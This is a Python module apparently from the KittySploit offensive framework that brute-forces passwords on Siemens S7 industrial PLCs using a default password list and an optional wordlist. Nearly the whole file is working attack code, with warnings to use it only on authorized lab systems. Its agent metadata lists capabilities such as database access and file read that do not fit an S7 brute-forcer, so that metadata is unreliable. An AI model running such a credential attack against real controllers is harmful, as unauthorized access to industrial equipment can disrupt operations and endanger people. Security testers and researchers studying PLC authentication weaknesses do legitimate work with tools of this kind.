#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

from kittysploit import *
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.s7_client import S7Client, bruteforce_s7_password
from lib.protocols.ics.siemens_defaults import DEFAULT_S7_PASSWORDS


class Module(Auxiliary, Ics_scanner_client):
    __info__ = {
        "name": "S7 PLC password bruteforce",
        "description": (
            "Attempts common Siemens S7 session passwords against protected PLCs. "
            "Use only on authorized lab systems — rate-limited by default."
        ),
        "author": "KittySploit Team",
        "tags": ["ics", "siemens", "s7comm", "credentials", "bruteforce"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_spray', 'network_probe'],
        'expected_requests': 10,
        'reversible': True,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 2.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["s7comm"], "S7comm port", True)
    rack = OptInteger(0, "PLC rack number", False)
    slot = OptInteger(1, "PLC slot number", False)
    wordlist = OptFile("", "Password wordlist (one password per line)", False)
    delay = OptFloat(0.5, "Delay between attempts in seconds", False)
    max_attempts = OptInteger(20, "Maximum passwords to try", False)

    def _load_candidates(self) -> list[str]:
        candidates = list(DEFAULT_S7_PASSWORDS)
        path = str(self.wordlist or "").strip()
        if path and os.path.isfile(path):
            with open(path, "r", encoding="utf-8", errors="ignore") as handle:
                for line in handle:
                    value = line.strip()
                    if value and value not in candidates:
                        candidates.append(value)
        limit = max(1, int(self.max_attempts or 20))
        return candidates[:limit]

    def run(self):
        host = self._host()
        if not host:
            print_warning("Target is required")
            return False

        print_warning("Only run against authorized OT lab PLCs")
        candidates = self._load_candidates()
        print_status(
            f"Trying up to {len(candidates)} password(s) on {host}:{self._port()} "
            f"(delay={self.delay}s)..."
        )

        probe = S7Client(host, self._port(), self._timeout(), int(self.rack or 0), int(self.slot or 1))
        if probe.connect():
            identity = probe.identify()
            probe.close()
            if identity.protection_level == 1:
                print_warning("PLC protection level 1 — no password required")
                return False

        result = bruteforce_s7_password(
            host,
            candidates,
            self._port(),
            self._timeout(),
            int(self.rack or 0),
            int(self.slot or 1),
            float(self.delay or 0.5),
        )

        if result.success:
            label = repr(result.password) if result.password else "empty"
            print_success(f"S7 password found after {result.attempts} attempt(s): {label}")
            return True

        print_info(f"No password matched after {result.attempts} attempt(s)")
        return False
